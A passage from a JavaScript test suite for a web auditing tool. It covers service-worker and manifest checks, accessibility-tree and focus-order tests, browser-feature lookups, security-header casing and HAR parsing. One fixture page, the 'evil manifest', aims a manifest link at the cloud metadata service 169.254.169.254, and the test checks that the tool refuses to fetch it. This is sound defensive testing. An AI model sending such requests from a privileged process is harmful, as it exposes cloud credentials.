    name: 'Fixture App',
    short_name: 'Fixture',
    start_url: '/',
    scope: '/',
    display: 'standalone',
    theme_color: '#123456',
    icons: [
      { src: '/icon-192.png', sizes: '192x192', type: 'image/png' },
      { src: '/icon-512.png', sizes: '512x512', type: 'image/png' },
    ],
  });
  const pixel = Uint8Array.from(
    atob('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg=='),
    (c) => c.charCodeAt(0),
  );
  const swPage = (title) => `<!doctype html><html><head><title>${title}</title>` +
    '<link rel="manifest" href="/manifest.webmanifest">' +
    '<script>navigator.serviceWorker.register("/sw.js")</script></head>' +
    `<body><h1>${title}</h1><p>Fixture body content for the resilience primitive.</p></body></html>`;
  // A page-controlled manifest href must not make the privileged Node process
  // fetch a private address: the guard has to refuse it and persist nothing into
  // the report (threat model I2 / F-003, web-uplift-2kh). 169.254.169.254 is the
  // cloud metadata service.
  const evilManifestPage = '<!doctype html><html><head><title>Evil manifest</title>' +
    '<link rel="manifest" href="http://169.254.169.254/latest/meta-data/"></head>' +
    '<body><h1>Evil manifest</h1></body></html>';

  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    const send = (type, body, code = 200, extra = {}) => {
      res.writeHead(code, { 'Content-Type': type, ...extra });
      res.end(body);
    };
    if (path === '/sw.js') return send('text/javascript', swJs);
    if (path === '/manifest.webmanifest') return send('application/manifest+json', manifest);
    if (path === '/offline.html') {
      return send('text/html', '<!doctype html><html><head><title>Offline fallback</title></head>' +
        '<body><h1>Offline fallback</h1><p>Cached by the service worker.</p></body></html>');
    }
    if (path.startsWith('/icon-')) return send('image/png', pixel);
    if (path === '/favicon.ico') {
      res.writeHead(204);
      res.end();
      return;
    }
    if (path === '/no-sw') {
      return send('text/html', '<!doctype html><html><head><title>No service worker</title></head>' +
        '<body><h1>No service worker</h1><p>Nothing resilient here.</p></body></html>');
    }
    if (path === '/evil-manifest') return send('text/html', evilManifestPage);
    // no-store, so the browser's HTTP cache cannot quietly stand in for the
    // service worker's fallback: offline emulation still serves cache hits.
    if (path === '/uncached-sw') return send('text/html', swPage('Uncached page with service worker'), 200, { 'Cache-Control': 'no-store' });
    return send('text/html', swPage('Fixture with service worker'));
  });

  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const base = `http://127.0.0.1:${port}`;
    const out = join(tmp, 'resilience-sw.json');

    const withSw = await gather('resilience', `${base}/`, { quiet: true, wait: 800, out });
    assert(
      withSw.manifest.found === true && withSw.manifest.fields?.name === 'Fixture App' && withSw.manifest.icons.length === 2,
      `resilience: the manifest was not resolved with its fields: ${JSON.stringify(withSw.manifest)}`,
    );
    assert(
      withSw.serviceWorker.scriptTextHasFetchListener === true,
      `resilience: the fetch listener was not read from the worker script: ${JSON.stringify(withSw.serviceWorker)}`,
    );
    assert(
      withSw.serviceWorker.page.controller?.endsWith('/sw.js') === true,
      `resilience: the page should report its controller: ${JSON.stringify(withSw.serviceWorker.page)}`,
    );
    const cdpRegs = withSw.serviceWorker.cdp.registrations;
    assert(
      cdpRegs.some((r) => r.pageOrigin && r.scopeURL.startsWith(base)),
      `resilience: the page-origin registration should be in the CDP list: ${JSON.stringify(cdpRegs)}`,
    );
    assert(
      cdpRegs.some((r) => !r.pageOrigin),
      `resilience: the browser's own workers must be marked as not this origin: ${JSON.stringify(cdpRegs)}`,
    );
    const signals = withSw.installabilitySignals;
    assert(
      signals.secureContext === true && signals.manifestResolved === true && signals.hasName === true &&
        signals.has192Icon === true && signals.has512Icon === true && signals.displayStandaloneish === true &&
        signals.serviceWorkerRegistered === true && signals.serviceWorkerHasFetchListener === true,
      `resilience: installability signals are wrong: ${JSON.stringify(signals)}`,
    );

    // Offline: the precached URL renders from cache, controlled by the worker,
    // and the legible artifact is on disk.
    assert(
      withSw.offline.navigationFailed === false && withSw.offline.rendered?.title === 'Fixture with service worker',
      `resilience: the precached page should render offline: ${JSON.stringify(withSw.offline)}`,
    );
    assert(
      withSw.offline.rendered.controlled === true,
      `resilience: the offline render should be under the worker's control: ${JSON.stringify(withSw.offline.rendered)}`,
    );
    assert(
      typeof withSw.offline.screenshot === 'string' && statSync(withSw.offline.screenshot).size > 0,
      `resilience: the offline screenshot should exist: ${withSw.offline.screenshot}`,
    );

    // An uncached URL inside the worker's scope falls back to the offline page.
    const fallback = await gather('resilience', `${base}/uncached-sw`, { quiet: true, wait: 800, screenshots: false });
    assert(
      fallback.offline.navigationFailed === false && fallback.offline.rendered?.title === 'Offline fallback',
      `resilience: an uncached URL should render the fallback: ${JSON.stringify(fallback.offline)}`,
    );

    // Nothing resilient: the offline navigation fails and says why.
    const bare = await gather('resilience', `${base}/no-sw`, { quiet: true, wait: 500, screenshots: false });
    assert(
      bare.serviceWorker.page.registrations.length === 0 && bare.installabilitySignals.serviceWorkerRegistered === false,
      `resilience: a page without a worker should report none: ${JSON.stringify(bare.serviceWorker)}`,
    );
    assert(
      bare.manifest.found === false && bare.installabilitySignals.manifestResolved === false,
      `resilience: a page without a manifest should report none: ${JSON.stringify(bare.manifest)}`,
    );
    assert(
      bare.offline.navigationFailed === true && typeof bare.offline.errorText === 'string' && bare.offline.rendered === null,
      `resilience: offline navigation should fail with a net error: ${JSON.stringify(bare.offline)}`,
    );

    // A page-controlled manifest href pointing at a private address must be
    // refused by the guard, with no body persisted into the evidence.
    const evil = await gather('resilience', `${base}/evil-manifest`, { quiet: true, wait: 300, screenshots: false });
    assert(
      evil.manifest.found === false &&
        evil.manifest.data === null &&
        /refused:/.test(String(evil.manifest.fetchError)) &&
        evil.installabilitySignals.manifestResolved === false,
      `resilience: a manifest href pointing at a private address must be refused with nothing persisted: ${JSON.stringify(evil.manifest)}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// be-inclusive/names-roles-labels and structure-and-focus cannot be judged from
// DOM attributes alone: aria-labelledby overrides aria-label, a name can come
// from title, and a subtree hidden by aria-hidden is still in the tab order.
// This drives the computed AX tree and the real tab order (web-uplift-5lp).
async function testA11yTreePrimitive() {
  const page = [
    '<!doctype html><html lang="en"><head><title>a11y fixture</title><style>',
    '  body { margin: 0; font-family: sans-serif; }',
    '  button, input, a { display: inline-block; margin: 4px; }',
    '  .no-outline:focus { outline: none; }',
    '  .visible:focus { outline: 3px solid #f00; }',
    '</style></head><body>',
    '<header><h1>Accessibility fixture</h1></header>',
    '<nav aria-label="Main navigation"><a href="#1" id="first" class="visible">One</a><a href="#2" id="second">Two</a></nav>',
    '<main>',
    '<button id="labelled" aria-label="Ignored label" aria-labelledby="lbl">x</button><span id="lbl">Labelled by text</span>',
    '<button id="titled" title="Name from title"></button>',
    '<button id="no-outline" class="no-outline">No outline</button>',
    '<div aria-hidden="true"><button id="hidden-button">Hidden button</button></div>',
    '<a href="#skipped" id="tabindex-minus" tabindex="-1">Not in tab order</a>',
    '<input id="email" type="email" aria-label="Email address">',
    '<h2 id="heading-2">Section</h2>',
    '</main>',
    '<footer><a href="#3" id="third">Three</a></footer>',
    '</body></html>',
  ].join('\n');

  const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(page);
  });

  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const result = await gather('a11ytree', `http://127.0.0.1:${port}/`, { quiet: true, wait: 600 });

    const flat = [];
    const walk = (n) => {
      if (!n) return;
      flat.push(n);
      for (const child of n.children || []) walk(child);
    };
    walk(result.tree.root);
    const accessible = flat.filter((n) => !n.ignored);
    const named = (role, name) => accessible.find((n) => n.role === role && n.name === name);

    assert(
      named('navigation', 'Main navigation') && named('main') && named('contentinfo'),
      `a11ytree: landmark roles/names missing from the computed tree: ${JSON.stringify(result.tree.roleCounts)}`,
    );
    assert(
      !!named('button', 'Labelled by text'),
      `a11ytree: aria-labelledby should win over aria-label in the computed name: ${JSON.stringify(accessible.filter((n) => n.role === 'button'))}`,
    );
    assert(
      !!named('button', 'Name from title'),
      `a11ytree: a name coming from title should appear in the computed tree: ${JSON.stringify(accessible.filter((n) => n.role === 'button'))}`,
    );
    assert(
      !accessible.some((n) => n.role === 'button' && n.name === 'Hidden button'),
      'a11ytree: a button inside aria-hidden must not be exposed as an accessible button',
    );
    assert(result.tree.ignoredCount >= 1, `a11ytree: the aria-hidden subtree should be ignored: ${result.tree.ignoredCount}`);
    assert(
      result.tree.truncated === false && result.tree.maxDepth >= 3 && result.tree.totalNodes > 10,
      `a11ytree: the tree census looks wrong: ${JSON.stringify({ total: result.tree.totalNodes, projected: result.tree.nodesProjected, depth: result.tree.maxDepth })}`,
    );
    assert(
      result.tree.maxNodes === 400 && result.focusOrder.maxStops === 60,
      `a11ytree: the effective caps should be reported: ${JSON.stringify({ maxNodes: result.tree.maxNodes, maxStops: result.focusOrder.maxStops })}`,
    );

    // The real tab order: DOM order, tabindex=-1 skipped, and aria-hidden content
    // still reachable (which the tree says is hidden).
    const ids = result.focusOrder.stops.filter((s) => !s.isBody).map((s) => s.id);
    assert(
      JSON.stringify(ids) === JSON.stringify(['first', 'second', 'labelled', 'titled', 'no-outline', 'hidden-button', 'email', 'third']),
      `a11ytree: focus order is wrong: ${JSON.stringify(ids)}`,
    );
    assert(
      !ids.includes('tabindex-minus'),
      `a11ytree: tabindex=-1 must stay out of the tab order: ${JSON.stringify(ids)}`,
    );
    assert(
      result.focusOrder.stopsInsideAriaHidden === 1 && result.focusOrder.stops.some((s) => s.id === 'hidden-button' && s.insideAriaHidden === true),
      `a11ytree: the focusable element inside aria-hidden should be recorded as such: ${JSON.stringify(result.focusOrder.stops.map((s) => [s.id, s.insideAriaHidden]))}`,
    );
    assert(result.focusOrder.cycleDetected === true, 'a11ytree: the walk should detect the tab cycle wrapping');

    // Focus indicators: the author-suppressed one reads as none, the styled one
    // as visible.
    const noOutline = result.focusOrder.stops.find((s) => s.id === 'no-outline');
    const firstStop = result.focusOrder.stops.find((s) => s.id === 'first');
    assert(
      noOutline?.hasVisibleIndicator === false && noOutline.outline.style === 'none',
      `a11ytree: outline:none should read as no visible indicator: ${JSON.stringify(noOutline)}`,
    );
    assert(
      firstStop?.hasVisibleIndicator === true,
      `a11ytree: a 3px outline should read as a visible indicator: ${JSON.stringify(firstStop)}`,
    );

    // The caps are the model's to widen, and a widened or lowered cap is echoed
    // in the output rather than applied silently.
    const narrowCaps = await gather('a11ytree', `http://127.0.0.1:${port}/`, { quiet: true, wait: 400, maxNodes: 5, maxStops: 2 });
    assert(
      narrowCaps.tree.maxNodes === 5 && narrowCaps.tree.nodesProjected <= 5 && narrowCaps.tree.truncated === true,
      `a11ytree: --max-nodes should cap the projection and say so: ${JSON.stringify({ maxNodes: narrowCaps.tree.maxNodes, projected: narrowCaps.tree.nodesProjected, truncated: narrowCaps.tree.truncated })}`,
    );
    assert(
      narrowCaps.focusOrder.maxStops === 2 && narrowCaps.focusOrder.stopCount === 2 && narrowCaps.focusOrder.truncated === true,
      `a11ytree: --max-stops should cap the walk and say so: ${JSON.stringify({ maxStops: narrowCaps.focusOrder.maxStops, stops: narrowCaps.focusOrder.stopCount, truncated: narrowCaps.focusOrder.truncated })}`,
    );

    // A bad value must fall back to the documented default rather than
    // producing an empty tree.
    const badCaps = await gather('a11ytree', `http://127.0.0.1:${port}/`, { quiet: true, wait: 400, maxNodes: 0, maxStops: Number.NaN });
    assert(
      badCaps.tree.maxNodes === 400 && badCaps.focusOrder.maxStops === 60 && badCaps.tree.nodesProjected > 5,
      `a11ytree: invalid caps should fall back to the defaults: ${JSON.stringify({ maxNodes: badCaps.tree.maxNodes, maxStops: badCaps.focusOrder.maxStops, projected: badCaps.tree.nodesProjected })}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

async function testBaselineOracle() {
  const { lookupBaseline, formatBaseline } = await import('../knowledge/baseline.mjs');

  // 1. Exact ID lookup
  const newly = lookupBaseline('light-dark');
  assert(newly.found === true, 'baseline: light-dark should be found');
  assert(newly.id === 'light-dark' && newly.status === 'newly', 'baseline: light-dark should be newly available');
  assert(newly.featureId === 'light-dark' && newly.featureName === 'light-dark()', 'baseline: schema aliases featureId/featureName must be present');
  assert(newly.fallbackMandatory === true, 'baseline: newly available should mandate a fallback');
  assert(newly.lowDate === '2024-05-13', `baseline: lowDate for light-dark should be 2024-05-13, got ${newly.lowDate}`);

  const widely = lookupBaseline('color-scheme');
  assert(widely.found === true, 'baseline: color-scheme should be found');
  assert(widely.status === 'widely' && widely.fallbackMandatory === false, 'baseline: color-scheme should be widely available');
  assert(widely.highDate === '2024-08-03', `baseline: highDate for color-scheme should be 2024-08-03, got ${widely.highDate}`);

  // 2. BCD compat key lookup & property suffix
  const anchor = lookupBaseline('position-anchor');
  assert(anchor.found === true && anchor.id === 'anchor-positioning', 'baseline: position-anchor should resolve to anchor-positioning');
  assert(anchor.status === 'limited' && anchor.fallbackMandatory === true, 'baseline: anchor-positioning should be limited');

  const fullBcd = lookupBaseline('css.properties.position-anchor');
  assert(fullBcd.found === true && fullBcd.id === 'anchor-positioning', 'baseline: full BCD key should resolve');

  // 3. Name lookup & parenthesis tolerance
  const byName = lookupBaseline('Anchor positioning');
  assert(byName.found === true && byName.id === 'anchor-positioning', 'baseline: lookup by name should resolve');
  const withParens = lookupBaseline('light-dark()');
  assert(withParens.found === true && withParens.id === 'light-dark', 'baseline: query with () should resolve');

  // 4. Symbol forms (@container, :has, :popover-open, ::part)
  const container = lookupBaseline('@container');
  assert(container.found === true && container.id === 'container-queries', 'baseline: @container should resolve to container-queries');
  assert(container.status === 'widely' && container.fallbackMandatory === false, 'baseline: container-queries should be widely available');

  const has = lookupBaseline(':has');
  assert(has.found === true && has.id === 'has', 'baseline: :has should resolve to has');
  assert(has.status === 'widely', 'baseline: :has should be widely available');

  const popover = lookupBaseline(':popover-open');
  assert(popover.found === true && popover.id === 'popover', 'baseline: :popover-open should resolve to popover');
  assert(popover.status === 'newly' && popover.fallbackMandatory === true, 'baseline: popover should be newly available with mandatory fallback');

  // 5. Ambiguous short keys resolve to CSS types first, not data-order collisions
  const min = lookupBaseline('min');
  assert(min.found === true && min.id === 'min-max-clamp', `baseline: min should resolve to min-max-clamp, got ${min.id}`);
  assert(min.status === 'widely', 'baseline: min-max-clamp should be widely available');

  const max = lookupBaseline('max');
  assert(max.found === true && max.id === 'min-max-clamp', `baseline: max should resolve to min-max-clamp, got ${max.id}`);

  // 6. Redirect resolution (single and plural targets)
  const redirect = lookupBaseline('masonry');
  assert(redirect.found === true && redirect.id === 'grid-lanes', 'baseline: masonry should resolve to grid-lanes');
  assert(redirect.redirectedFrom === 'masonry', 'baseline: redirectedFrom should record the alias');

  const pluralRedirect = lookupBaseline('text-wrap-style');
  assert(pluralRedirect.found === true && pluralRedirect.id === 'text-wrap-style', 'baseline: text-wrap-style should be found');
  assert(Array.isArray(pluralRedirect.targets) && pluralRedirect.targets.length === 3, 'baseline: text-wrap-style should have 3 targets');
  assert(pluralRedirect.status === 'limited' && pluralRedirect.fallbackMandatory === true, 'baseline: split feature with limited targets must be limited with mandatory fallback');
  const formattedPlural = formatBaseline(pluralRedirect);
  assert(formattedPlural.includes('text-wrap: pretty') && formattedPlural.includes('Limited availability'), 'baseline: format plural should show individual target statuses');

  // 7. Unknown query & suggestions
  const unknown = lookupBaseline('non-existent-xyz-feature');
  assert(unknown.found === false, 'baseline: unknown feature should return found=false');

  const formattedUnknown = formatBaseline(unknown);
  assert(formattedUnknown.includes('Unknown web platform feature "non-existent-xyz-feature"'), 'baseline: format unknown should name feature');

  // 8. CLI execution: bin/web-uplift.mjs baseline <query> [--json]
  const jsonRun = run(process.execPath, ['bin/web-uplift.mjs', 'baseline', 'light-dark', '--json']);
  assert(jsonRun.status === 0, `baseline CLI: json run failed:\n${jsonRun.stderr}`);
  const parsedJson = JSON.parse(jsonRun.stdout);
  assert(parsedJson.id === 'light-dark' && parsedJson.featureId === 'light-dark' && parsedJson.status === 'newly', 'baseline CLI: json output mismatch');

  const textRun = run(process.execPath, ['bin/web-uplift.mjs', 'baseline', 'color-scheme']);
  assert(textRun.status === 0, `baseline CLI: text run failed:\n${textRun.stderr}`);
  assert(textRun.stdout.includes('Baseline Widely available') && textRun.stdout.includes('Fallback: optional'),
    `baseline CLI: text output unexpected:\n${textRun.stdout}`);

  const symbolRun = run(process.execPath, ['bin/web-uplift.mjs', 'baseline', '@container']);
  assert(symbolRun.status === 0 && symbolRun.stdout.includes('container-queries'),
    `baseline CLI: @container run failed:\n${symbolRun.stdout}`);

  const badRun = run(process.execPath, ['bin/web-uplift.mjs', 'baseline', 'non-existent-xyz-feature']);
  assert(badRun.status === 1, `baseline CLI: bad query should exit 1, got ${badRun.status}`);
  assert(badRun.stderr.includes('Unknown web platform feature'), `baseline CLI: bad query should log error to stderr:\n${badRun.stderr}`);
}

async function testFlowNormalize() {
  const { normalizeFlow } = await import('../runner/flow.mjs');

  // A Chrome DevTools Recorder export normalises cleanly (same shape we use).
  const recorderJson = {
    title: 'Search',
    steps: [
      { type: 'setViewport', width: 1200, height: 800 },
      { type: 'navigate', url: 'https://example.com/' },
      { type: 'click', selectors: [['aria/Search'], ['#go']], target: 'main' },
      null, // stray/empty entries are dropped
    ],
  };
  const flow = normalizeFlow(recorderJson);
  assert(flow.title === 'Search', 'flow: title should carry through');
  assert(flow.steps.length === 3, `flow: empty steps should be dropped, got ${flow.steps.length}`);
  assert(flow.steps[2].selectors[0][0] === 'aria/Search', 'flow: selectors preserved');

  // Not-a-flow inputs throw.
  let threw = false;
  try { normalizeFlow({ nope: true }); } catch { threw = true; }
  assert(threw, 'flow: an object without steps[] must throw');
}

function run(command, args, opts = {}) {
  return spawnSync(command, args, {
    cwd: repoRoot,
    encoding: 'utf8',
    ...opts,
  });
}

// Async variant: spawnSync would block this process's event loop, so an
// in-process test server could not answer the child's browser. Bounded so a
// hung browser fails the suite instead of hanging it.
function runAsync(command, args, opts = {}) {
  return new Promise((resolvePromise) => {
    const child = spawn(command, args, { cwd: repoRoot, timeout: 120000, ...opts });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (chunk) => { stdout += chunk; });
    child.stderr.on('data', (chunk) => { stderr += chunk; });
    child.on('close', (status) => resolvePromise({ status, stdout, stderr }));
  });
}

function assert(condition, message) {
  if (!condition) throw new Error(message);
}

// The Chrome bootstrap was flaky in CI: a bare CDP({ port }) relied on a
// default page target that Chrome for Testing 154 sometimes does not provide.
// Keep a cheap (3-iteration) launch+newSession loop in the suite so a
// regression fails fast instead of surfacing as a random mid-suite death.
async function testLaunchSessionLoop() {
  const result = await runAsync(process.execPath, [join(repoRoot, 'tests', 'launch-loop.mjs'), '3']);
  assert(result.status === 0, `launch-session loop failed:
${result.stderr || result.stdout}`);
}

// Deterministic teardown guard (web-uplift-knz): every browser the harness
// launches must be fully gone (process tree AND profile dir) after close().
// The launcher used to leave a wedged browser group and one /tmp/web-uplift-cdp-*
// husk per boot, which the (now stopped) VM reaper had to clean up. Kept cheap:
// one browser in the suite; the standalone default is three.
async function testNoOrphanBrowser() {
  const result = await runAsync(process.execPath, [join(repoRoot, 'tests', 'no-orphan-browser.mjs'), '1']);
  assert(result.status === 0, `no-orphan-browser failed:
${result.stderr || result.stdout}`);
}

function testSyntaxChecks() {
  for (const file of listFiles(repoRoot, (p) => p.endsWith('.mjs'))) {
    const result = run(process.execPath, ['--check', file]);
    assert(result.status === 0, `syntax check failed for ${file}:\n${result.stderr || result.stdout}`);
  }
}

function testPackageRootImportIsSideEffectFree() {
  const result = run(process.execPath, [
    '--input-type=module',
    '-e',
    "import 'web-uplift'; console.log('import-ok')",
  ]);
  assert(result.status === 0, `package root import failed:\n${result.stderr || result.stdout}`);
  assert(result.stdout.trim() === 'import-ok', `package root import produced side effects:\n${result.stdout}`);
}

function testSchemaValidation() {
  const ajv = new Ajv2020({ allErrors: true, strict: false });
  addFormats(ajv);

  const configSchema = readJson('schema/config.schema.json');
  const findingsSchema = readJson('schema/findings.schema.json');
  ajv.compile(configSchema);
  ajv.compile(findingsSchema);

  validateJson(ajv, configSchema, 'web-uplift.json');
  validateJson(ajv, configSchema, 'web-uplift.example.json');
  validateJson(ajv, findingsSchema, 'examples/playground-report.json');
  validateJson(ajv, findingsSchema, 'examples/playground-report-fixed.json');
}

// The headers primitive reads a site's security response headers, and header names
// are case-insensitive (RFC 9110): Chrome hands them over as the server sent them, so
// an HTTP/1.1 response arrives capitalised and an HTTP/2 one lowercased. The lookup
// used to be lowercase-only, which made every capitalised response report all six
// headers as missing - a false negative written into the tool's own security
// evidence. This drives the real primitive over both wire shapes and checks that a
// header the response does not send still reads as absent, so the fix cannot be
// over-broad (web-uplift-0w6).
async function testHeadersPrimitiveFindsHeadersRegardlessOfNameCase() {
  const page = (title) =>
    `<!doctype html><html lang="en"><head><title>${title}</title></head><body><main><h1>${title}</h1></main></body></html>`;
  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/caps') {
      // HTTP/1.1 wire shape: Node writes header names exactly as given.
      res.writeHead(200, {
        'Content-Type': 'text/html',
        'Content-Security-Policy': "default-src 'self'",
        'Strict-Transport-Security': 'max-age=63072000',
      });
      res.end(page('caps'));
      return;
    }
    if (path === '/lower') {
      // The shape HTTP/2 delivers: the case that already worked, kept as a
      // regression guard in the other direction.
      res.writeHead(200, {
        'content-type': 'text/html',
        'content-security-policy': "default-src 'self'",
        'x-content-type-options': 'nosniff',
      });
      res.end(page('lower'));
      return;
    }
    if (path === '/empty') {
      // Present but empty protects nothing: it must read as its own state, not as
      // absent and not as a pass.
      res.setHeader('Content-Security-Policy', '');
      res.setHeader('Referrer-Policy', '');
      res.setHeader('Strict-Transport-Security', 'max-age=63072000');
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(page('empty'));
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(page('bare'));
  });
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const base = `http://127.0.0.1:${port}`;
    // Prove the fixtures carry the casing each case is about: res.rawHeaders keeps
    // the wire casing, while res.headers is lowercased by Node itself and would
    // prove nothing here.
    const wireNames = async (path) =>
      new Promise((resolve, reject) => {
        const request = http.get(`${base}${path}`, (res) => {
          const names = res.rawHeaders.filter((_, index) => index % 2 === 0);
          res.resume();
          resolve(names);
        });
        request.on('error', reject);
      });
    assert(
      (await wireNames('/caps')).includes('Content-Security-Policy'),
      'the HTTP/1.1 fixture must really send a capitalised header name',
    );
    assert(
      (await wireNames('/lower')).includes('content-security-policy'),
      'the lowercase fixture must really send a lowercase header name',
    );

    const caps = await gather('headers', `${base}/caps`, { quiet: true, wait: 400 });
    assert(
      caps.securityHeaders['content-security-policy'].present === true,
      `a capitalised response header must be found: ${JSON.stringify(caps.securityHeaders['content-security-policy'])}`,
    );
    assert(
      caps.securityHeaders['content-security-policy'].value === "default-src 'self'",
      `the header value must survive the normalisation: ${JSON.stringify(caps.securityHeaders['content-security-policy'])}`,
    );
    assert(
      caps.securityHeaders['strict-transport-security'].present === true,
      `a capitalised HSTS header must be found: ${JSON.stringify(caps.securityHeaders['strict-transport-security'])}`,
    );
    assert(
      caps.securityHeaders['x-frame-options'].present === false,
      `a header the response does not send must still read as absent: ${JSON.stringify(caps.securityHeaders['x-frame-options'])}`,
    );

    const lower = await gather('headers', `${base}/lower`, { quiet: true, wait: 400 });
    assert(
      lower.securityHeaders['content-security-policy'].present === true,
      `a lowercase response header must still be found: ${JSON.stringify(lower.securityHeaders['content-security-policy'])}`,
    );
    assert(
      lower.securityHeaders['x-content-type-options'].present === true,
      `a lowercase nosniff header must still be found: ${JSON.stringify(lower.securityHeaders['x-content-type-options'])}`,
    );

    const bare = await gather('headers', `${base}/bare`, { quiet: true, wait: 400 });
    assert(
      bare.securityHeaders['content-security-policy'].present === false &&
        bare.securityHeaders['strict-transport-security'].present === false,
      `a response that sends no security headers must report none: ${JSON.stringify(bare.securityHeaders)}`,
    );

    // Present-but-empty is a third state. Reading it as absent would be the false
    // negative this bead fixed; reading it as a pass would be false assurance - an
    // empty security header protects nothing.
    const empty = await gather('headers', `${base}/empty`, { quiet: true, wait: 400 });
    const emptyCsp = empty.securityHeaders['content-security-policy'];
    assert(emptyCsp.present === true, `a header sent with an empty value is still present: ${JSON.stringify(emptyCsp)}`);
    assert(
      emptyCsp.empty === true && emptyCsp.value === '',
      `an empty value must be recorded as its own state: ${JSON.stringify(emptyCsp)}`,
    );
    assert(
      emptyCsp.issues.includes('present but empty'),
      `an empty security header must not read as a pass: ${JSON.stringify(emptyCsp)}`,
    );
    assert(
      empty.securityHeaders['referrer-policy'].empty === true,
      `an empty referrer-policy is empty too: ${JSON.stringify(empty.securityHeaders['referrer-policy'])}`,
    );
    const controlHsts = empty.securityHeaders['strict-transport-security'];
    assert(
      controlHsts.present === true && controlHsts.empty === false && controlHsts.issues.length === 0,
      `a header sent with a value must read as neither absent nor empty: ${JSON.stringify(controlHsts)}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// The HAR path reads two header values out of the raw CDP objects: a request's
// content-type and a redirect's location. Both were looked up by one exact casing
// ('Content-Type', and only 'Location'/'location'), so any other casing was missed
// - the fetch API sends a lower-case name, and a server may send LOCATION in any
// case at all. Both now go through headerMap, the same lower-casing the rest of
// the HAR path uses (web-uplift-0w6).
async function testHarReadsRequestContentTypeAndRedirectLocationRegardlessOfCase() {
  const received = [];
  const page = (title, script = '') =>
    `<!doctype html><html lang="en"><head><title>${title}</title></head><body><main><h1>${title}</h1></main>${script}</body></html>`;
  const postScript = `<script>fetch('/post',{method:'POST',headers:{'content-type':'application/json'},body:'{"a":1}'}).catch(()=>{})</script>`;
  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/post') {
      received.push(req.rawHeaders);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end('{"ok":true}');
      return;
    }
    if (path === '/redirect') {
      res.writeHead(302, { 'LOCATION': '/final', 'Content-Type': 'text/html' });
      res.end(page('redirect', postScript));
      return;
    }
    // A redirect response body is never executed, so the POST belongs to the page
    // the redirect lands on.
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(page(path === '/final' ? 'final' : 'root', path === '/final' ? postScript : ''));
  });
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const base = `http://127.0.0.1:${port}`;
    // Prove the fixtures: the redirect really leaves with an all-caps name, and the
    // POST really arrives with a lower-case one.
    const wire = await new Promise((resolve, reject) => {
      const request = http.get(`${base}/redirect`, (res) => {
        const names = res.rawHeaders.filter((_, index) => index % 2 === 0);
        res.resume();
        resolve(names);
      });
      request.on('error', reject);
    });
    assert(wire.includes('LOCATION'), `the redirect fixture must really send an all-caps header name: ${JSON.stringify(wire)}`);

    const out = join(tmp, 'har-header-case.har');
    await gather('har', `${base}/redirect`, { quiet: true, wait: 1200, out });
    const entries = JSON.parse(readFileSync(out, 'utf8')).log.entries;
    const redirect = entries.find((entry) => entry.response.status === 302);
    assert(redirect, `the redirect entry must be recorded: ${JSON.stringify(entries.map((entry) => entry.response.status))}`);
    assert(
      redirect.response.redirectURL === '/final',
      `a redirect location must be read whatever case its name arrives in: ${JSON.stringify(redirect.response.redirectURL)}`,
    );
    assert(received.length > 0, 'the fixture must have received the POST');
    assert(
      received[0].includes('content-type'),
      `the POST must really arrive with a lower-case header name: ${JSON.stringify(received[0])}`,
    );
    const post = entries.find((entry) => entry.request.method === 'POST');
    assert(post, `the POST entry must be recorded: ${JSON.stringify(entries.map((entry) => entry.request.method))}`);
    assert(
      post.request.postData?.mimeType === 'application/json',
      `a request content-type must be read whatever case its name arrives in: ${JSON.stringify(post.request.postData)}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

function testInstalledEvidenceCli() {
  const target = join(tmp, 'installed-target');
  const tarball = packTarball();
  const install = run('npm', [
    'exec',
    '--yes',
    '--package',
    tarball,
    '--',
    'web-uplift',
    'install',
    '--agent',
    'codex',
    '--target',
    target,
  ], { env: noUpdateEnv() });
  assert(install.status === 0, `install failed: ${install.stderr || install.stdout}`);

  const manifest = JSON.parse(readFileSync(join(target, '.web-uplift/manifest.json'), 'utf8'));
  const pkg = readJson('package.json');
  assert(manifest.package === pkg.name, `installed manifest package mismatch: ${JSON.stringify(manifest)}`);
  assert(manifest.version === pkg.version, `installed manifest version mismatch: ${JSON.stringify(manifest)}`);
  assert(manifest.agents.includes('codex'), `installed manifest missed selected agent: ${JSON.stringify(manifest)}`);

  // The install vendors a dependency tree into the consumer's project, and those
  // packages are in no consumer lockfile, so the manifest is the only place that
  // says which versions are on disk. The record has to be TRUE, not just present:
  // every version it names must match what was actually copied (web-uplift-92b).
  const vendored = manifest.vendoredDependencies;
  assert(
    Array.isArray(vendored) && vendored.length > 0,
    `installed manifest must record the vendored dependency versions: ${JSON.stringify(manifest)}`,
  );
  const names = vendored.map((entry) => entry.name);
  assert(
    names.includes('chrome-remote-interface') && names.includes('web-features'),
    `both vendored roots must be recorded: ${JSON.stringify(names)}`,
  );
  assert(
    [...names].sort().join(',') === names.join(','),
    `the vendored record must be sorted by name so the manifest is stable: ${JSON.stringify(names)}`,
  );
  assert(new Set(names).size === names.length, `the vendored record must not repeat a package: ${JSON.stringify(names)}`);
  for (const entry of vendored) {
    const manifestPath = join(target, '.web-uplift', 'node_modules', ...entry.name.split('/'), 'package.json');
    const copied = JSON.parse(readFileSync(manifestPath, 'utf8'));
